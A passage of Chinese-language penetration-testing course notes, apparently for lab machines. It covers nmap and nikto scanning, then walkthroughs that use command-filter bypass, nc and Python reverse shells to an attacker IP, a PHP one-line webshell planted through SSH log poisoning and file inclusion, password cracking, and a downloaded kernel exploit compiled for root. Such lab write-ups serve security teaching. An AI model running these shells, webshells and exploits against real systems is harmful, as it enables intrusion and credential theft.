      for n2 in namelist:
          for n3 in namelist:
              if n1 == n2 or n1 == n3 or n2 == n3:
                  pass
              else :
                  passwd.append(n1 + n2 + n3)
  for i in passwd :
      for j in range(1, 100):
          passwdlist.append(i+str(j)+"\n")
  with open(r"C:\Users\LEGION\Desktop\mima.txt","w") as f :
      f.writelines(passwdlist)
  ```

  





# ==第十天==

# nmap

## 概述

* 一款开源的**网络探测、安全审核**工具
* 快速扫描大型网络
* 扫描单台主机
* 可以发现网络上有哪些主机，这些主机提供什么服务，这些服务运行在什么操作系统，该机器使用了什么报文过滤（如ping不通但可以连接ssh，防火墙禁止了icmp协议单开启了ssh协议）

## 使用

* 扫描网段内的主机

  ```
  nmap 网段/掩码位数
  #nmap 192.168.191.0/24
  ```

* 扫描一个网段内某个端口开放的机器

  ```
  mmap -p <端口号> 网段/掩码位数
  ```

* 对某个IP全端口扫描

  ```
  nmap -p- IP
  ```

* 对网段全端口扫描

  ```
  nmap -p- 网段IP/掩码位数
  ```

* 设置端口探测范围

  ```
  nmap -p2000-3000 网段IP/掩码位数 
  #端口范围1-65535
  ```

* 扫描出某个IP具体的端口、**具体服务**

  ```
  nmap -sV -p- IP
  ```

* 使用ping扫描，不进行端口扫描

  ```
  -sP
  ```

* 无ping扫描

  ```
  -Pn
  ```

* 指定端口

  ```
  -p
  ```

* 打印过程

  ```
  -v
  ```

* 探测目标主机版本

  ```
  -O
  ```

* 显示服务的详细版本

  ```
  -sV
  ```

* 全面扫描

  ```
  -A
  ```

* 扫描速度

  ```
  -T0 规避IPS，速度最慢，准确率最高
  -T1 规避防火墙
  -T2
  -T3
  -T4 快速扫描(默认)
  -T5 速度最快，准确率最低
  ```

  



## 效果

* 扫描网段内的主机

  ```
  nmap 网段/掩码位数
  #nmap 192.168.191.0/24
  ```

  ![image-20230811113811701](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230811113811701.png)

* 扫描一个网段内某个端口开放的机器

  ```
  mmap -p <端口号> 网段/掩码位数
  ```

  ![image-20230811114021146](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230811114021146.png)

* 对某个IP全端口扫描

  ```
  nmap -p- IP
  ```

  ![image-20230811114105042](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230811114105042.png)

* 对网段全端口扫描

  ```
  nmap -p- 网段IP/掩码位数
  ```

  ![image-20230811114130775](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230811114130775.png)

* 设置端口探测范围

  ```
  nmap -p2000-3000 网段IP/掩码位数 
  #端口范围1-65535
  ```

  ![image-20230811114300543](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230811114300543.png)

* 扫描出某个IP具体的端口、服务

  ```
  nmap -sV -p- IP
  ```

  ![image-20230811114337053](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230811114337053.png)





# ==第十一天==



# 渗透测试靶场1

## 对IP进行详细扫描

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814110905908.png" alt="image-20230814110905908" style="zoom:67%;" />

发现目标网站开启了http和ssh服务

可以直接在浏览器输入目标IP进入网页

并发现其系统为linux

将扫描到的信息复制到文档中

## 进入网站查看信息

* 发现有各部门的联系方式信息，将其复制到信息搜集的文档中

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814110414510.png" alt="image-20230814110414510" style="zoom:50%;" />

* 查看登陆网页发现登录功能无法使用

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814110553392.png" alt="image-20230814110553392" style="zoom:50%;" />

* 在联系方式中发现bob属于IT部门，并在网页源代码中发现了bob的字眼，猜测bob可能是网站的开发维护或后台管理人员，需加留意

  ![image-20230814110740604](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814110740604.png)

  

## 使用网页扫描工具nikto扫描网站的其他网页

* 使用方法（扫描网站根路径）

  ```
  nikto -h http://IP/ 端口号
  ```

* 尝试扫描

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814111808147.png" alt="image-20230814111808147" style="zoom:67%;" />

  扫描出服务器版本、服务器开启时间、后台网页等信息

* 尝试访问扫描出的隐藏网页

  * ![image-20230814112059632](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814112059632.png)

  * 发现了一个可以输入命令的网页

    ![image-20230814112153404](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814112153404.png)

## 尝试命令

* 输入cat、ls、ping、pwd等命令发现被过滤无法执行

* 命令尝试

  ```
  more /etc/passwd
  ```

  发现了用户文件

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814112459882.png" alt="image-20230814112459882" style="zoom:50%;" />

  并发现了可疑人员bob的用户文件信息

  ![image-20230814112656086](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814112656086.png)

  将信息复制到搜集文档中

  

* 尝试使用绝对路径绕过过滤

  ```
  /bin/ls
  ```

  发现可以成功绕过

  ![image-20230814112837729](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814112837729.png)

  可以尝试访问其中文件

  

## 反弹shell

瑞士军刀nc

```
nc -lvvp 8888
l监听模式
v详细输出，用两个-v可得到更详细的内容
p端口
```

![image-20230814113329345](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814113329345.png)

被控制主机连接命令(此实验绕过需要在nc前加`/bin/`)

```
nc -e /binbash <IP> <端口号>
```

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814113602999.png" alt="image-20230814113602999" style="zoom:67%;" />

连接成功

![image-20230814113627068](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814113627068.png)

此时可以输入命令

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814113657505.png" alt="image-20230814113657505" style="zoom:80%;" />



## 显示路径命令

```
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20230814113943670](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814113943670.png)

## 查看文件信息

* 进入家目录查看信息

  ```
  cd /home
  ```

  ![image-20230814115635922](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814115635922.png)

  * 在elliot文件夹的theadminisdumb.txt文件看到了password的字眼

    ![image-20230814140056272](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814140056272.png)

    并收集到了James的密码信息：Qwerty

  * 查看隐藏文件

    ```
    ls -la
    ```

    在bob的隐藏文件中发现了old_passwordfile.txt的文件

    ![image-20230814140622617](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814140622617.png)

    其中包含jc的密码Qwerty

## 尝试远程登录

*  使用James的账户密码登陆失败

  ```
  ssh James@10.9.47.240 -p 25468
  ```

  ![image-20230814144001774](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814144001774.png)

* 使用jc的账户密码登陆成功

## ![image-20230814144257147](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814144257147.png)进入bob目录下查看

* 

  ![image-20230814144806515](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814144806515.png)

* 查看Dociments（文件）

  发现了其下的Secret（秘密）文件

  进入查看

  发现其中有加密的登陆文件

  ![image-20230814145038400](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814145038400.png)

  看到Keep_Out(阻止)文件，进入

  ![image-20230814150453132](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814150453132.png)

  分别进入两个文件中查看

  ![image-20230814150624839](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814150624839.png)

  查看“不让看”的文件

  ![image-20230814150925504](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814150925504.png)

  执行.sh文件

  ```
  ./notes.sh
  ```

  ![image-20230814151025504](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814151025504.png)

  猜测是个藏头诗（怎么猜的？？？我也不知道！）

  ```
  HARPOCRATES
  ```

  并猜测其为/bob/Documents/下.gpg加密文件的密钥（发证我猜不出来）

  ![image-20230814151353158](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814151353158.png)

  ***.gpg为加密文件***

  解密.gpg文件

  ```
  gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
  ```

  解密出来了重要人员**bob**的密码

  ![image-20230814151742690](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814151742690.png)

## 尝试登录bob用户

* linux登录其他账户

  ```
  su 用户名
  ```

* 尝试进入root用户的家目录

  * 登陆成功

    ![image-20230814153832599](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814153832599.png)

  * 查看root用户的家目录

    ```
    cat /etc/passwd
    ```

    cat执行失败尝试more

    ![image-20230814154105706](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814154105706.png)

    发现在根目录下

  

## 提权

* bob为系统管理员，猜测其密码可能为root密码

* 尝试登陆，登陆成功

  ![image-20230814154739455](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814154739455.png)

  ![image-20230814155058413](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814155058413.png)





## 知识点总结

* 查看其它文件

  在查看文件staff（员工）文件时cat命令无法显示

  尝试使用more命令查看

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814145815568.png" alt="image-20230814145815568" style="zoom:67%;" />

  

* gpg文件储存的加密的信息

  gpg解密

  ```
  gpg --batch --passphrase 密钥 -d .gpg文件
  ```

  

* 查看帮助文档

  ```
  man <命令>
  ```

  

# 靶场2



* 详细扫描

  ![image-20230814164446065](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814164446065.png)



* 查看网页源代码

  ![image-20230814165126585](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814165126585.png)

  尝试打开后台网站

* 查看home下bob文件夹的旧密码文件

  ![image-20230814171026302](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814171026302.png)

* ssh登录

  ![image-20230814171138247](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814171138247.png)

  

  ![image-20230814171446324](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814171446324.png)





* 找到bob桌面下加密的密码文件

  ![image-20230814173441846](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814173441846.png)

* john解密加密的login文件

  ![image-20230814173425388](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814173425388.png)

* bob用户登录

  ![image-20230814173528626](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814173528626.png)





* 解出root密码

  ![image-20230814173821250](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814173821250.png)

  ![image-20230814173836466](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814173836466.png)

* 成功

  ![image-20230814174046613](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230814174046613.png)









* 靶机强化

1. ```
   rm -rf
   ```

2. ```
   echo 这不是密码！这不是密码！求求你了别打我网站了，打了我饭碗就不保了，好人一生平安 > password.txt
   ```

3. ```
   echo '$6$SVWE7Nh8$zwYhBHDW.aXAI22LPmgT/rAWL97rrL0NZkW0GkrSgDPkfXF07edzYTuXgYsM10NikrII.EAKDAFS0vxd4lDDZ/' >> password.txt
   ```

4. ```
   mv password.txt .password.txt
   ```









# ==第12天==

# potato

* 扫描信息

  ![image-20230815103253417](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815103253417.png)

* 爆破密码

  potato（猜测）

  letmein

  ![image-20230815100151778](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815100151778.png)

* 登录ssh

  ![image-20230815103420298](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815103420298.png)

* 提权（searchsplpit）

  * 查看服务器内核版本

    ```
    uname -a
    ```

    ![image-20230815103916031](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815103916031.png)

  * kali搜索其版本漏洞

    ```
    searchsploit 版本号
    searchsploit ubuntu 3.13.0
    ```

    查询到其漏洞

    ![image-20230815104208339](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815104208339.png)

  * 使用第一个漏洞，将其下载到kali

    ```
    searchsploit -p 37292.c   #下载并显示路径
    searchsploit -m 37292.c   #下载到当前目录
    ```

    ![image-20230815104419606](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815104419606.png)

  * 将此文件复制到当前目录下（如果使用-m则无需此操作）

    ```
    cp /usr/share/exploitdb/exploits/linux/local/37292.c ./
    ```

    ![image-20230815104548239](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815104548239.png)

  * 开启http服务供靶机下载

    ![image-20230815104628017](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815104628017.png)

  * 先切到tmp目录下再下载，因为tmp目录是存放临时文件的目录

    ```
    cd /tmp
    ```

  * 靶机下载提权文件

    ```
    wget http://10.9.47.193/37292.c
    ```

    ![image-20230815105213657](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815105213657.png)

  * 在kali中查看提权文件如何使用（提权文件中的注释）

    ![image-20230815112211745](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815112211745.png)

  *  用gcc将.c文件编译成exp文件才可利用

    ```
    gcc 37292.c -o exp
    ```

  * 提权

    ```
    chmod +777 exp
    ```

    ![image-20230815105406670](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815105406670.png)

    执行

    ```
    ./exp
    ```

    ![image-20230815105521100](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815105521100.png)

    提权成功

* 查看flag

  ![image-20230815105623654](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815105623654.png)



# Potato2

* 在/info.php网页的源代码中发现了php包含

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815163742991.png" alt="image-20230815163742991" style="zoom:67%;" />

* php引用一个另一个php文件中的函数include(other.php)

  IP?参数=文件路径

  尝试查看其日志文件，可以看到ssh登录日志

  ```
  http://10.9.47.181/info.php?zc=/var/log/auth.log
  ```

  ![image-20230815164010992](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815164010992.png)

* 通过ssh登录在用户名位置上传一句话木马

  ```
  ssh '<?php system($_GET['gjl']); ?>'@10.9.47.181 -p 7120
  ```

  随便输入密码

  ![image-20230815165103495](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815165103495.png)

  植入木马后可以在地址栏输入指令

* 开启nc反弹shell监听

  ```
  nc -lvvp 8888
  ```

  ![image-20230815165442175](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815165442175.png)

* 在地址栏中输入python的反弹shell指令

  ```python
  http://10.9.47.181/info.php?zc=/var/log/auth.log&gjl=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.47.193",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
  ```

* 成功连接

  ![image-20230815165612490](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815165612490.png)

  

* 查找关键文件

  ![image-20230815165705607](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815165705607.png)

  加密过的密码为

  ```
  +++++ +++++ [->++ +++++ +++<] >+.++ +++++ +.<++ +++[- >---- -<]>- -----
  .<+++ ++[-> ----- <]>.< +++++ +[->+ +++++ <]>++ +++++ +++++ .<+++ [->--
  -<]>- ----. ----- .<+++ +++[- >++++ ++<]> ++++. <++++ ++[-> ----- -<]>-
  ----- ---.< +++++ [->++ +++<] >++++ .<+++ +++[- >---- --<]> ----- .<+++
  ++++[ ->+++ ++++< ]>+++ ++++. <++++ ++[-> ----- -<]>- ----- --.<+ ++++[
  ->+++ ++<]> +.<++ ++++[ ->--- ---<] >---- --..< 
  ```

* brainfuck解码

  百度搜索其为

  brainfuck语言，寻找在线解析网站

  [brainfuck在线解析](https://www.w3cschool.cn/tryrun/runcode?lang=brainfuck)

  运行结果如下

  ![image-20230815170102465](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815170102465.png)

  ```
  emN5eWRzMjAyMg==
  ```

  

* 尝试登录ssh

  ![image-20230815170213212](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815170213212.png)

  登陆失败

  猜测其可能被二次加密

  继续解密

* [Base64解码](https://base64.us/)

  最终解出密码`zcyyds2022`

  ![image-20230815170544544](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815170544544.png)

* 再次登录ssh

  登陆成功

  ![image-20230815170700111](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230815170700111.png)





* 小结

  * 文件包含漏洞

    通过ssh登录日志注入木马

    ```
    <?php system($_GET['gjl']); ?>
    ```

    kali使用nc开启反弹shell

    python反弹到kali的机器

  * brainfuck解码

  * Base64解码











# 渗透思路

* nmap扫描IP详细信息，查看开启服务

* F12查看网页信息

* 尝试文本框命令输入/绕过

* nc反弹shell

* 登陆密码爆破

* /etc/passwd和/etc/shadow文件

* 查看相关信息文件

* nikto扫描后台网站

* searchsploit查找漏洞

* 地址栏中尝试注入命令

* 密码解码

* 若存在登录窗口尝试万能密码

* 若网页能上传文件考虑文件上传漏洞

* 使用Nessus软件扫描漏洞

* 查看服务器版本在网上寻找此版本漏洞

  

* 21端口ftp上传木马？密码爆破

* 22端口ssh密码爆破



-p-换成-A不使用全端口扫描，扫描常用端口







==445端口入侵==
